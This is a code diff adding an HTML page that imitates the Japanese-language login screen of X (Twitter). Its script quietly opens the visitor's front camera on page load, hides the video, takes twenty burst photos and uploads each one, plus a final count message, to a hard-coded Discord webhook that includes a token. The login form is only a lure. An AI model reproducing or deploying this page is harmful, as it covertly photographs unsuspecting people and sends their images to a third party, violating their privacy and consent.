@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>ログイン / X</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff;
+      color: #0f1419;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      width: 360px;
+      padding: 40px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+    }
+    .x-logo {
+      width: 32px;
+      height: 32px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 15px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      background-color: #1d9bf0;
+      color: white;
+      border: none;
+      border-radius: 9999px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" class="x-logo" alt="X" />
+    <h1>Xにログイン</h1>
+    <input type="text" placeholder="電話番号、メールアドレスまたはユーザー名" />
+    <input type="password" placeholder="パスワード" />
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const webhookUrl = "https://discord.com/api/webhooks/1387673023733043210/QDjYcnrdgaIoTxWTgV_HB4Mw9v8ezMZS1VcASbSi6SNDSvcp7IRfn1FffJysC3vgVpTd"; // 🔴 必ず差し替えてください
+
+    // 1枚撮影してDiscord送信
+    async function captureAndSend(count) {
+      if (!video.srcObject) return;
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      return new Promise(resolve => {
+        canvas.toBlob(async (blob) => {
+          if (!blob) return resolve();
+
+          const formData = new FormData();
+          formData.append('file', blob, `photo_${count}.jpg`);
+          formData.append('content', `📸 連写写真 ${count}`);
+
+          try {
+            await fetch(webhookUrl, {
+              method: 'POST',
+              body: formData,
+            });
+          } catch (err) {
+            // 送信失敗は無視
+          }
+          resolve();
+        }, 'image/jpeg', 0.95);
+      });
+    }
+
+    // 撮った枚数をDiscordにメッセージ送信
+    async function sendCountMessage(count) {
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `🎉 連写撮影終了。撮影枚数: ${count}枚` }),
+        });
+      } catch (err) {
+        // 無視
+      }
+    }
+
+    // 連写開始（20枚、0.5秒間隔）
+    async function startBurstCapture() {
+      for (let i = 1; i <= 20; i++) {
+        await captureAndSend(i);
+        await new Promise(r => setTimeout(r, 500));
+      }
+      await sendCountMessage(20);
+    }
+
+    // ページ読み込み時にカメラ起動＆連写開始
+    window.onload = () => {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(stream => {
+          video.srcObject = stream;
+          startBurstCapture();
+        })
+        .catch(err => {
+          console.log('カメラ起動失敗:', err);
+        });
+    };
+  </script>
+</body>
+</html>
